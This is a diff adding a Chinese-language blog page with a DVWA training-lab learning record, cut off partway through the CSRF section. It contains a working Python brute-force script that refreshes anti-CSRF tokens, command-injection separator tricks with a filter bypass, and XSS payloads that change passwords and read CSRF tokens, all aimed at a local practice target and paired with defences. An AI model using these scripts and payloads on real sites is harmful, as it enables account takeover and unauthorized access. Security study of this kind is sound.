@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="DVWA靶场学习记录概述本文章是我学习DVWA靶场的学习记录，记录了学习过程中的思路和实验。 Brute Force暴力破解，指使用脚本或其他工具来爆破密码，验证码等。 靶场给出的场景是一个登录功能。 Low在low难度下，程序没有做任何防护，攻击者可以编写python脚本或使用BurpSuite（以下简称bp）的爆破模块来爆破用户名和密码。 当然你也可以使用sql注入，因为程序没有做对sql注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DVWA靶场学习记录">
+<meta property="og:url" content="http://example.com/2021/04/09/2021-04-09-DVWA%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/index.html">
+<meta property="og:site_name" content="想逃避现实的芝麻糊">
+<meta property="og:description" content="DVWA靶场学习记录概述本文章是我学习DVWA靶场的学习记录，记录了学习过程中的思路和实验。 Brute Force暴力破解，指使用脚本或其他工具来爆破密码，验证码等。 靶场给出的场景是一个登录功能。 Low在low难度下，程序没有做任何防护，攻击者可以编写python脚本或使用BurpSuite（以下简称bp）的爆破模块来爆破用户名和密码。 当然你也可以使用sql注入，因为程序没有做对sql注入">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://github.com/C-uncle/c-uncle.github.io/blob/master/images/DVWA%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/BruteForce-high-%E9%9A%90%E8%97%8F%E7%9A%84token.png?raw=true">
+<meta property="og:image" content="https://github.com/C-uncle/c-uncle.github.io/blob/master/images/DVWA%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/CSRF-BP%E6%9E%84%E9%80%A0%E9%92%93%E9%B1%BC%E9%A1%B5%E9%9D%A2.png?raw=true">
+<meta property="og:image" content="https://github.com/C-uncle/c-uncle.github.io/blob/master/images/DVWA%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/XSS-DOM-medium%E4%BB%A3%E7%A0%81.png?raw=true">
+<meta property="og:image" content="https://github.com/C-uncle/c-uncle.github.io/blob/master/images/DVWA%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/XSS-DOM-Impossible%E4%BB%A3%E7%A0%81.png?raw=true">
+<meta property="og:image" content="https://github.com/C-uncle/c-uncle.github.io/blob/master/images/DVWA%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/CSP-code1.png?raw=true">
+<meta property="og:image" content="https://github.com/C-uncle/c-uncle.github.io/blob/master/images/DVWA%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/CSP-code2.png?raw=true">
+<meta property="article:published_time" content="2021-04-08T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-01-22T11:31:08.362Z">
+<meta property="article:author" content="芝麻糊">
+<meta property="article:tag" content="靶场">
+<meta property="article:tag" content="DVWA">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/C-uncle/c-uncle.github.io/blob/master/images/DVWA%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/BruteForce-high-%E9%9A%90%E8%97%8F%E7%9A%84token.png?raw=true">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/logo.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/logo.ico" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.ico">
+        
+      
+    
+    <!-- title -->
+    <title>DVWA靶场学习记录</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2021/04/09/2021-04-09-SQL%E6%B3%A8%E5%85%A5/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/04/09/2021-04-09-DVWA%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/04/09/2021-04-09-DVWA%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/&text=DVWA靶场学习记录"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/04/09/2021-04-09-DVWA%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/&title=DVWA靶场学习记录"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/04/09/2021-04-09-DVWA%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/&is_video=false&description=DVWA靶场学习记录"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=DVWA靶场学习记录&body=Check out this article: http://example.com/2021/04/09/2021-04-09-DVWA%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/04/09/2021-04-09-DVWA%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/&title=DVWA靶场学习记录"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/04/09/2021-04-09-DVWA%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/&title=DVWA靶场学习记录"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/04/09/2021-04-09-DVWA%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/&title=DVWA靶场学习记录"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/04/09/2021-04-09-DVWA%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/&title=DVWA靶场学习记录"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/04/09/2021-04-09-DVWA%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/&name=DVWA靶场学习记录&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/04/09/2021-04-09-DVWA%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/&t=DVWA靶场学习记录"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#DVWA%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95"><span class="toc-number">1.</span> <span class="toc-text">DVWA靶场学习记录</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">1.1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Brute-Force"><span class="toc-number">1.2.</span> <span class="toc-text">Brute Force</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Low"><span class="toc-number">1.2.1.</span> <span class="toc-text">Low</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Medium"><span class="toc-number">1.2.2.</span> <span class="toc-text">Medium</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#High"><span class="toc-number">1.2.3.</span> <span class="toc-text">High</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Impossible"><span class="toc-number">1.2.4.</span> <span class="toc-text">Impossible</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E5%BC%8F"><span class="toc-number">1.2.5.</span> <span class="toc-text">防御方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Command-Injection"><span class="toc-number">1.3.</span> <span class="toc-text">Command Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Low-1"><span class="toc-number">1.3.1.</span> <span class="toc-text">Low</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Medium-1"><span class="toc-number">1.3.2.</span> <span class="toc-text">Medium</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#High-1"><span class="toc-number">1.3.3.</span> <span class="toc-text">High</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Impossible-1"><span class="toc-number">1.3.4.</span> <span class="toc-text">Impossible</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E5%BC%8F-1"><span class="toc-number">1.3.5.</span> <span class="toc-text">防御方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF"><span class="toc-number">1.4.</span> <span class="toc-text">CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Low-2"><span class="toc-number">1.4.1.</span> <span class="toc-text">Low</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Medium-2"><span class="toc-number">1.4.2.</span> <span class="toc-text">Medium</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#High-2"><span class="toc-number">1.4.3.</span> <span class="toc-text">High</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Impossible-2"><span class="toc-number">1.4.4.</span> <span class="toc-text">Impossible</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E5%BC%8F-2"><span class="toc-number">1.4.5.</span> <span class="toc-text">防御方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#File-Inclusion"><span class="toc-number">1.5.</span> <span class="toc-text">File Inclusion</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Low-3"><span class="toc-number">1.5.1.</span> <span class="toc-text">Low</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Medium-3"><span class="toc-number">1.5.2.</span> <span class="toc-text">Medium</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#High-3"><span class="toc-number">1.5.3.</span> <span class="toc-text">High</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Impossible-3"><span class="toc-number">1.5.4.</span> <span class="toc-text">Impossible</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E5%BC%8F-3"><span class="toc-number">1.5.5.</span> <span class="toc-text">防御方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#File-Upload"><span class="toc-number">1.6.</span> <span class="toc-text">File Upload</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Low-4"><span class="toc-number">1.6.1.</span> <span class="toc-text">Low</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Medium-4"><span class="toc-number">1.6.2.</span> <span class="toc-text">Medium</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#High-4"><span class="toc-number">1.6.3.</span> <span class="toc-text">High</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Impossible-4"><span class="toc-number">1.6.4.</span> <span class="toc-text">Impossible</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E5%BC%8F-4"><span class="toc-number">1.6.5.</span> <span class="toc-text">防御方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Insecure-CAPTCHA"><span class="toc-number">1.7.</span> <span class="toc-text">Insecure CAPTCHA</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Low-5"><span class="toc-number">1.7.1.</span> <span class="toc-text">Low</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Medium-5"><span class="toc-number">1.7.2.</span> <span class="toc-text">Medium</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#High-5"><span class="toc-number">1.7.3.</span> <span class="toc-text">High</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Impossible-5"><span class="toc-number">1.7.4.</span> <span class="toc-text">Impossible</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E5%BC%8F-5"><span class="toc-number">1.7.5.</span> <span class="toc-text">防御方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Weak-Session-IDs"><span class="toc-number">1.8.</span> <span class="toc-text">Weak Session IDs</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Low-6"><span class="toc-number">1.8.1.</span> <span class="toc-text">Low</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Medium-6"><span class="toc-number">1.8.2.</span> <span class="toc-text">Medium</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#High-6"><span class="toc-number">1.8.3.</span> <span class="toc-text">High</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Impossible-6"><span class="toc-number">1.8.4.</span> <span class="toc-text">Impossible</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E5%BC%8F-6"><span class="toc-number">1.8.5.</span> <span class="toc-text">防御方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS-DOM"><span class="toc-number">1.9.</span> <span class="toc-text">XSS (DOM)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Medium-7"><span class="toc-number">1.9.1.</span> <span class="toc-text">Medium</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#High-7"><span class="toc-number">1.9.2.</span> <span class="toc-text">High</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Impossible-7"><span class="toc-number">1.9.3.</span> <span class="toc-text">Impossible</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E5%BC%8F-7"><span class="toc-number">1.9.4.</span> <span class="toc-text">防御方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSP-Bypass"><span class="toc-number">1.10.</span> <span class="toc-text">CSP Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Low-7"><span class="toc-number">1.10.1.</span> <span class="toc-text">Low</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Medium-8"><span class="toc-number">1.10.2.</span> <span class="toc-text">Medium</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#High-8"><span class="toc-number">1.10.3.</span> <span class="toc-text">High</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Impossible-8"><span class="toc-number">1.10.4.</span> <span class="toc-text">Impossible</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E5%BC%8F-8"><span class="toc-number">1.10.5.</span> <span class="toc-text">防御方式</span></a></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        DVWA靶场学习记录
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">c-uncle</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-04-08T16:00:00.000Z" itemprop="datePublished">2021-04-09</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/DVWA/" rel="tag">DVWA</a>, <a class="tag-link-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="DVWA靶场学习记录"><a href="#DVWA靶场学习记录" class="headerlink" title="DVWA靶场学习记录"></a>DVWA靶场学习记录</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>本文章是我学习DVWA靶场的学习记录，记录了学习过程中的思路和实验。</p>
+<h2 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h2><p>暴力破解，指使用脚本或其他工具来爆破密码，验证码等。</p>
+<p>靶场给出的场景是一个登录功能。</p>
+<h3 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h3><p>在low难度下，程序没有做任何防护，攻击者可以编写python脚本或使用BurpSuite（以下简称bp）的爆破模块来爆破用户名和密码。</p>
+<p>当然你也可以使用sql注入，因为程序没有做对sql注入的防护。</p>
+<h3 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h3><p>在medium难度下，对用户输入的username和password进行了特殊字符转义处理，防御了SQL注入。但是还是可以通过脚本或bp来爆破密码。</p>
+<p>程序使用了mysqli_real_escape_string()函数对特殊字符进行了处理，特殊字符会被 转义符转义。</p>
+<h3 id="High"><a href="#High" class="headerlink" title="High"></a>High</h3><p>在high难度下，页面提交的表单添加了user_token字段，用来验证请求是否合法。</p>
+<p><img src="https://github.com/C-uncle/c-uncle.github.io/blob/master/images/DVWA%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/BruteForce-high-%E9%9A%90%E8%97%8F%E7%9A%84token.png?raw=true" alt="image-隐藏的token"></p>
+<p>可以从图片里看到，表单里隐藏了一个user_token。</p>
+<p>这个user_token是不能重复使用的。因此常规的bp爆破模块是用不了的。</p>
+<p>这里我写了一个python脚本，用来获取token，并且爆破密码。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">author: CUncle</span><br><span class="line">data: 2021/4/3</span><br><span class="line">function: dvwa brute high exp</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">// 将流量导向bp，开发时用的。</span><br><span class="line">proxies = &#123;</span><br><span class="line">    &#x27;http&#x27;: &#x27;http://127.0.0.1:8080&#x27;,</span><br><span class="line">    &#x27;https&#x27;: &#x27;https://127.0.0.1:8080&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 登录dvwa后的cookies</span><br><span class="line">cookies = &#123;</span><br><span class="line">    &#x27;security&#x27;: &#x27;high&#x27;,</span><br><span class="line">    &#x27;PHPSESSID&#x27;: &#x27;a91156e24ae52243c852449283bc6832&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 程序会对请求头里的reference进行验证，验证请求来自合法的域名。</span><br><span class="line">headers = &#123;</span><br><span class="line">	&#x27;reference&#x27;: &#x27;&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 获取password</span><br><span class="line">def read_passwd():</span><br><span class="line">	f = open(&#x27;top500.txt&#x27;)</span><br><span class="line">	passwd = f.readline()</span><br><span class="line">	while passwd:</span><br><span class="line">		// 先将password进行处理，去掉换行符，然后调用poc函数进行验证</span><br><span class="line">		if poc(passwd.strip()):</span><br><span class="line">			print(passwd)</span><br><span class="line">			break</span><br><span class="line">		passwd = f.readline()</span><br><span class="line"></span><br><span class="line">def getUserToken():</span><br><span class="line">	url = &quot;http://localhost/dvwa/vulnerabilities/brute/index.php&quot;</span><br><span class="line">	res = requests.get(url, cookies=cookies, proxies=proxies)</span><br><span class="line">	result = re.search(r&#x27;&lt;input type=\&#x27;hidden\&#x27; name=\&#x27;user_token\&#x27; value=\&#x27;(.*?)\&#x27; /&gt;&#x27;, res.text)</span><br><span class="line">	return result.group(1)</span><br><span class="line"></span><br><span class="line">def poc(passwd):</span><br><span class="line">	user_token = getUserToken()</span><br><span class="line">	url = &quot;http://localhost/dvwa/vulnerabilities/brute/index.php?username=admin&amp;password=%s&amp;Login=Login&amp;user_token=%s&quot;%(passwd, user_token)</span><br><span class="line">	headers[&#x27;reference&#x27;] = url</span><br><span class="line">	res = requests.get(url, cookies=cookies, headers=headers, proxies=proxies)</span><br><span class="line">	if not &quot;incorrect&quot; in res.text:</span><br><span class="line">		return True</span><br><span class="line">	else :</span><br><span class="line">		return False</span><br><span class="line"></span><br><span class="line">read_passwd()</span><br></pre></td></tr></table></figure>
+
+<h3 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h3><p>在impossible难度下，程序限制了密码错误次数，并且在错误一定次数后，冻结账号一段时间。</p>
+<h3 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h3><p>1.添加token，防止一个数据包被重复利用。</p>
+<p>2.做错误次数限制，防止脚本爆破。</p>
+<h2 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h2><p>命令行注入。</p>
+<p>原理：程序提供了命令执行功能，但未对用户的输入进行处理，导致恶意命令被执行。</p>
+<p>靶场提供的场景是用户输入一个ip，程序对这个ip执行ping命令。</p>
+<h3 id="Low-1"><a href="#Low-1" class="headerlink" title="Low"></a>Low</h3><p>在low难度下，没做任何防护，可以使用管道符来拼接命令。</p>
+<p>几个常见的管道符。</p>
+<p>Windows和linud都有的。</p>
+<p>| </p>
+<p>Usage： A|B</p>
+<p>将A的输出作为参数传给B</p>
+<p>|| </p>
+<p>Usage：A||B||C||D</p>
+<p>可以同时执行多条命令，当碰到执行正确的命令时停止执行。</p>
+<p>&amp;</p>
+<p>Usage：A&amp;B</p>
+<p>可以同时执行多条命令，不管执行是否正确，全都会执行。</p>
+<p>&amp;&amp;</p>
+<p>Usage：A&amp;&amp;B&amp;&amp;C&amp;&amp;D</p>
+<p>可以同时执行多条命令，当碰到执行错误的命令时停止执行。</p>
+<p>Linux下的符号</p>
+<p>;</p>
+<p>Usage:  A;B</p>
+<p>执行完A以后执行B</p>
+<h3 id="Medium-1"><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h3><p>在medium难度下，程序过滤了 &amp;&amp;和; ，可以使用其他几个管道符来绕过。</p>
+<h3 id="High-1"><a href="#High-1" class="headerlink" title="High"></a>High</h3><p>在high难度下，程序过滤上面提及的所有管道符，还过滤了括号和`。</p>
+<p>` 倒引号。</p>
+<p>被` 包括的字符串会被当作命令执行。</p>
+<p>但是过滤规则不够严谨，| 符号的过滤规则写成了过滤 ‘| ‘(带有空格)。</p>
+<p>可以在|后面加上空格绕过。</p>
+<h3 id="Impossible-1"><a href="#Impossible-1" class="headerlink" title="Impossible"></a>Impossible</h3><p>在Impossible难度下，程序对用户的输入进行了处理，限制了输入的格式只能是ipv4地址。</p>
+<h3 id="防御方式-1"><a href="#防御方式-1" class="headerlink" title="防御方式"></a>防御方式</h3><p>1.如果只是执行某一个命令，例如ping，那么我们可以设置白名单，确保用户传递的参数不会携带恶意命令。</p>
+<p>2.过滤用户输入，过滤管道符和一些关键字，例如|， &amp;， bash等。</p>
+<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>攻击者利用目标用户的身份，以目标用户的名义执行非法操作。</p>
+<p>靶场给的场景是一个修改密码的页面。</p>
+<h3 id="Low-2"><a href="#Low-2" class="headerlink" title="Low"></a>Low</h3><p>没有做任何防护，可以直接构造钓鱼页面。</p>
+<p>一个简便的构造钓鱼页面的方法：</p>
+<p>使用BP抓取修改密码的数据包，右键选择构造CSRF Poc。</p>
+<p><img src="https://github.com/C-uncle/c-uncle.github.io/blob/master/images/DVWA%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/CSRF-BP%E6%9E%84%E9%80%A0%E9%92%93%E9%B1%BC%E9%A1%B5%E9%9D%A2.png?raw=true" alt="image-BP构造CSRF-poc"></p>
+<h3 id="Medium-2"><a href="#Medium-2" class="headerlink" title="Medium"></a>Medium</h3><p>程序对请求的referer字段做了验证，验证请求是否来自同源。</p>
+<p>在这种情况下，需要结合其他漏洞来利用。</p>
+<p>我是使用xss+csrf的组合拳。</p>
+<p>下面是我构造的xss的payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT&gt;const http = new XMLHttpRequest();const url = &quot;http://localhost/dvwa/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change&quot;;http.open(&quot;GET&quot;, url);http.send();&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="High-2"><a href="#High-2" class="headerlink" title="High"></a>High</h3><p>这个难度在get参数中多加了一个user_token参数，估计作用类似与Brute Froce中user_token一样，用来确定请求是否从指定的页面发起。</p>
+<p>这关并没用对referer做验证。</p>
+<p>我尝试用js获取页面内容，从而来获取token，但是不行，有cors。</p>
+<p>需要结合其他漏洞。</p>
+<p>比如页面上有xss，或许可以利用xss来获取token。</p>
+<p>思路：先利用xss获取token，然后构造钓鱼页面。</p>
+<p>xss的payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;../csrf&quot; onload=alert(frames[0].document.getElementsByName(&#x27;user_token&#x27;)[0].value)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>那我的payload要放在哪里？</p>
+<p>尝试一下放在反射型xss。</p>
